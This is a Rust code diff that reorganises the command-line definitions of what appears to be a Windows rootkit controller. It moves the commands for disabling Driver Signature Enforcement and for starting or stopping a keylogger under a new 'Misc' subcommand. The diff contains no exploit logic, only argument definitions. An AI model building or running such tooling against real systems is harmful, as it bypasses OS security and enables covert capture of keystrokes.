@@ -44,26 +44,14 @@ pub enum Commands {
         #[arg(long, value_hint = ValueHint::FilePath, value_parser = validate_sys_extension)]
         name: Option<String>,
     },
-    /// Operations related to DSE (Driver Signature Enforcement).
-    DSE {
-        /// Disable DSE.
-        #[arg(long)]
-        disable: bool,
-        
-        /// Enable DSE.
-        #[arg(long)]
-        enable: bool,
+
+    /// Operations related to Misc.
+    Misc {
+        /// Subcommands for Misc operations.
+        #[command(subcommand)]
+        sub_command: MisCommands,
     },
-    /// Operations related to Keylogger.
-    Keylogger {
-        /// Stop the keylogger.
-        #[arg(long)]
-        stop: bool,
-        
-        /// Start the keylogger.
-        #[arg(long)]
-        start: bool,
-    },
+
     /// Operations related to Registry.
     #[cfg(not(feature = "mapper"))]
     Registry {
@@ -248,6 +236,31 @@ pub enum ProcessCommands {
         #[arg(long, short, required = true)]
         type_: Options,
     }
+}
+
+#[derive(Subcommand)]
+pub enum MisCommands {
+    /// Operations related to DSE (Driver Signature Enforcement).
+    DSE {
+        /// Disable DSE.
+        #[arg(long)]
+        disable: bool,
+        
+        /// Enable DSE.
+        #[arg(long)]
+        enable: bool,
+    },
+
+    /// Operations related to Keylogger.
+    Keylogger {
+        /// Stop the keylogger.
+        #[arg(long)]
+        stop: bool,
+        
+        /// Start the keylogger.
+        #[arg(long)]
+        start: bool,
+    },
 }
 
 /// Enum representing the subcommands for thread operations.
